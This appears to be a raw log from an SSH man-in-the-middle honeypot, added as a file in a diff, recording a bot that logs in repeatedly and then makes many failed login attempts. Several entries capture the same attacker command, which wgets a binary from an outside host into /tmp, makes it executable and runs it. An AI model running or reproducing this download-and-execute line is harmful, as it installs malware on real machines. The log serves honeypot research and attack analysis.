@@ -1,0 +1,193 @@
+2020-11-14 22:51:00.248 - [Info] MITM Version: 1.26
+2020-11-14 22:51:00.252 - [Info] Auto Access Enabled: true
+2020-11-14 22:51:00.252 - [Debug] [Init] Auto Access Barrier: true
+2020-11-14 22:51:00.268 - [Info] SSH man-in-the-middle server for 172.20.0.201 listening on 0.0.0.0:10000
+2020-11-14 22:51:07.975 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:51:08.487 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:51:08.487 - [Debug] [Auto Access] Attacker: 67.207.90.208, Threshold: 1, Attempts: 1
+2020-11-14 22:51:08.487 - [Debug] [Auto Access] Compromising the honeypot
+2020-11-14 22:51:08.487 - [Debug] [Auto Access] Adding the following credentials: "138.68.49.252:46.45.154.140"
+2020-11-14 22:51:08.743 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-14 22:51:08.743 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.201
+2020-11-14 22:51:10.100 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:51:10.588 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:51:10.588 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-14 22:51:10.588 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.201
+2020-11-14 22:51:20.061 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-14 22:51:20.183 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.249.32.194/bins/ByeBye.x86 -O /tmp/ByeBye; chmod +x /tmp/ByeBye; /tmp/ByeBye ByeBye.x86
+2020-11-14 22:51:20.468 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:51:20.981 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:51:20.982 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-14 22:51:20.982 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.201
+2020-11-14 22:51:22.710 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:51:23.115 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-14 22:51:23.193 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:51:23.194 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-14 22:51:23.194 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.201
+2020-11-14 22:51:23.236 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.249.32.194/bins/ByeBye.x86 -O /tmp/ByeBye; chmod +x /tmp/ByeBye; /tmp/ByeBye ByeBye.x86
+2020-11-14 22:51:25.075 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-14 22:51:25.196 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.249.32.194/bins/ByeBye.x86 -O /tmp/ByeBye; chmod +x /tmp/ByeBye; /tmp/ByeBye ByeBye.x86
+2020-11-14 22:51:26.741 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-14 22:51:26.860 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.249.32.194/bins/ByeBye.x86 -O /tmp/ByeBye; chmod +x /tmp/ByeBye; /tmp/ByeBye ByeBye.x86
+2020-11-14 22:51:39.145 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:51:39.662 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:51:39.662 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-14 22:51:39.662 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.201
+2020-11-14 22:51:42.065 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-14 22:51:42.185 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.249.32.194/bins/ByeBye.x86 -O /tmp/ByeBye; chmod +x /tmp/ByeBye; /tmp/ByeBye ByeBye.x86
+2020-11-14 22:51:44.935 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:51:45.434 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:51:45.434 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-14 22:51:45.434 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.201
+2020-11-14 22:51:47.320 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-14 22:51:47.444 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.249.32.194/bins/ByeBye.x86 -O /tmp/ByeBye; chmod +x /tmp/ByeBye; /tmp/ByeBye ByeBye.x86
+2020-11-14 22:51:51.696 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:51:52.180 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:51:52.180 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-14 22:51:52.180 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.201
+2020-11-14 22:51:54.362 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-14 22:51:54.483 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.249.32.194/bins/ByeBye.x86 -O /tmp/ByeBye; chmod +x /tmp/ByeBye; /tmp/ByeBye ByeBye.x86
+2020-11-14 22:51:58.114 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:51:58.619 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:51:58.620 - [Debug] [Auth] Valid credentials - Password Authentication
+2020-11-14 22:51:58.620 - [Debug] [LXC] Attempting to connect to the honeypot: 172.20.0.201
+2020-11-14 22:52:01.295 - [Debug] [LXC-Auth] Attacker authenticated and is inside container
+2020-11-14 22:52:01.416 - [Debug] [EXEC] Noninteractive mode attacker command: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://46.249.32.194/bins/ByeBye.x86 -O /tmp/ByeBye; chmod +x /tmp/ByeBye; /tmp/ByeBye ByeBye.x86
+2020-11-14 22:52:31.884 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:52:32.381 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:52:32.382 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:52:32.382 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:52:32.444 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:52:34.169 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:52:34.722 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:52:34.723 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:52:34.723 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:52:34.796 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:52:47.329 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:52:47.858 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:52:47.858 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:52:47.859 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:52:47.923 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:52:49.961 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:52:50.453 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:52:50.454 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:52:50.454 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:52:50.516 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:53:04.126 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:53:04.607 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:53:04.607 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:53:04.608 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:53:04.670 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:53:09.877 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:53:10.368 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:53:10.369 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:53:10.369 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:53:10.435 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:53:21.681 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:53:22.175 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:53:22.175 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:53:22.175 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:53:22.238 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:53:27.917 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:53:28.396 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:53:28.396 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:53:28.396 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:53:28.460 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:53:56.778 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:53:57.268 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:53:57.268 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:53:57.268 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:53:57.330 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:53:59.059 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:53:59.556 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:53:59.556 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:53:59.557 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:53:59.619 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:54:14.149 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:54:14.641 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:54:14.641 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:54:14.641 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:54:14.714 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:54:16.402 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:54:16.890 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:54:16.890 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:54:16.890 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:54:16.951 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:54:30.326 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:54:30.813 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:54:30.813 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:54:30.813 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:54:30.883 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:54:36.630 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:54:37.116 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:54:37.119 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:54:37.119 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:54:37.180 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:54:46.552 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:54:47.038 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:54:47.039 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:54:47.039 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:54:47.100 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:54:52.653 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:54:53.184 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:54:53.185 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:54:53.185 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:54:53.281 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:55:24.541 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:55:25.025 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:55:25.025 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:55:25.026 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:55:25.089 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:55:26.926 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:55:27.415 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:55:27.415 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:55:27.415 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:55:27.479 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:55:40.378 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:55:40.859 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:55:40.860 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:55:40.860 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:55:40.920 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:55:42.599 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:55:43.091 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:55:43.092 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:55:43.092 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:55:43.152 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:55:56.376 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:55:56.856 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:55:56.856 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:55:56.857 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:55:56.917 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:56:02.468 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:56:02.964 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:56:02.964 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:56:02.965 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:56:03.027 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:56:13.348 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:56:13.845 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:56:13.846 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:56:13.846 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:56:13.908 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:56:19.339 - [Debug] [Connection] Attacker connected: 67.207.90.208 | Client Identification: SSH-2.0-libssh2_1.4.3
+2020-11-14 22:56:19.844 - [Debug] [Auth] Attacker 67.207.90.208 trying to authenticate with "password"
+2020-11-14 22:56:19.845 - [Debug] [Auth] Attacker authentication error: Invalid credentials - User does not exist
+2020-11-14 22:56:19.845 - [Debug] [Auth] Attacker: 67.207.90.208 has so far made 1 attempts. Remaining: 5 attempts
+2020-11-14 22:56:19.921 - [Debug] [Connection] Attacker closed the connection
+2020-11-14 22:56:21.387 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-14 22:56:21.388 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-14 22:56:21.390 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-14 22:56:21.391 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-14 22:56:21.394 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-14 22:56:21.394 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-14 22:56:21.397 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-14 22:56:21.397 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-14 22:56:21.400 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-14 22:56:21.401 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-14 22:56:21.404 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-14 22:56:21.404 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-14 22:56:21.407 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-14 22:56:21.407 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-14 22:56:21.410 - [Debug] [LXC] Container's OpenSSH server ended connection
+2020-11-14 22:56:21.410 - [Debug] [LXC] Container's OpenSSH server closed connection
+2020-11-14 22:56:21.460 - [Info] Exiting...
+2020-11-14 22:56:21.460 - [Debug] Cleaning up...
